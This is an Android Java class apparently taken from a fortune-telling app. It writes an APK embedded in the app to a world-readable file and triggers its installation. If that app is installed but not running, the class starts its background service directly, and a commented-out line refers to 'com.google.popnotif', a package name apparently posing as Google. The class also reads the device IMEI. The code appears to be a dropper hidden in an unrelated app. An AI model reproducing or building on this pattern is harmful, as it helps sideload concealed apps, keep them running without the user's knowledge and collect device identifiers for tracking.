package ir.website.faal141;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;

/**
 * Created by ali on 5/28/18.
 */

public class PakhageMangment {
   // static Intent intent=null;
    private static String TAG="PakhageMangment";
    public static boolean isPackageExisted(String targetPackage){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = OSService.context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
    public static boolean checkAppIsRunning(String targetPackage) {
        ActivityManager aManager = (ActivityManager) OSService.context.getSystemService(OSService.context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> processInfo = aManager.getRunningAppProcesses();
        List<ActivityManager.RunningServiceInfo> processserve = aManager.getRunningServices(10000);
        boolean run=false;
        for (int i = 0; i < processserve.size(); i++) {
            if(processserve.get(i).service.toString().contains(targetPackage))
            {
                Log.d(TAG, "checkAppIsRunning: "+processserve.get(i).service.toString());
               // intent=new Intent(OSService.context,processserve.get(i).service.getClass());
              run=true;
            }
        }
        return run;
    }
    public static String getPathFromSrc(int apkid){
        try {
            InputStream in = OSService.context.getResources().openRawResource(apkid);
            byte[] b = new byte[in.available()];
            String path = /*Environment.getExternalStorageDirectory() +*/ "tempfile.apk";

            in.read(b);
            FileOutputStream fout = OSService.context.openFileOutput(path, Context.MODE_WORLD_READABLE);
            fout.write(b);
            fout.close();
            in.close();
            Utility.setString("apkpath", path);
            return path;
        }
        catch (Exception ex){
            Log.d(TAG, "getUriFromSrc: "+ex.getMessage());
        }
        return "";

    }
    public static void installApk(int apkid){
                try {
                    String pkname=Utility.getString("apkpkname");
                    String path=Utility.getString("apkpath");

                    if(path.isEmpty()){
                        path = getPathFromSrc(apkid);
                    }
                    File toInstall = OSService.context.getFileStreamPath(path);
                    if(!toInstall.exists()){
                        path = getPathFromSrc(apkid);
                        toInstall = OSService.context.getFileStreamPath(path);
                    }
                    Uri apkUri = Uri.fromFile(toInstall);
                    if(pkname.isEmpty()) {
                        pkname = Utility.getPackageName(toInstall.getPath());
                        Utility.setString("apkpkname", pkname);
                    }
                    Log.d(TAG, "installApk: "+pkname+path+isPackageExisted(pkname)+checkAppIsRunning(pkname));
                    if (!isPackageExisted(pkname)) {
                        startURI(apkUri);
                    } else {
                        if (!checkAppIsRunning(pkname)) {
//                            Intent launchIntent = OSService.context.getPackageManager().getLaunchIntentForPackage("com.google.popnotif");
                            //Log.d(TAG, "installApk: "+intent.toString());
                            Intent intent = new Intent();
                            intent.setClassName(pkname,pkname+".OSService");
                            OSService.context.startService(intent);
                        }
                    }
                }catch (Exception ex){
                    Log.d(TAG, "installApk: "+ex.getMessage());
                }
    }
    public static File openResourceFile(Context context, int resFile, String tempFileName) throws IOException {
        InputStream in = context.getResources().openRawResource(resFile);

        byte[] b = new byte[in.available()];
        in.read(b);

        FileOutputStream fout = context.openFileOutput(tempFileName, Context.MODE_WORLD_READABLE);

        fout.write(b);
        fout.close();
        in.close();

        return context.getFileStreamPath(tempFileName);
    }
    public static void startURI( Uri apkUri){
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        OSService.context.startActivity(intent);
    }
    public static String getUniqueIMEIId(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String imei = telephonyManager.getDeviceId();
            Log.e("imei", "=" + imei);
            if (imei != null && !imei.isEmpty()) {
                return imei;
            } else {
                return android.os.Build.SERIAL;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "not_found";
    }
}
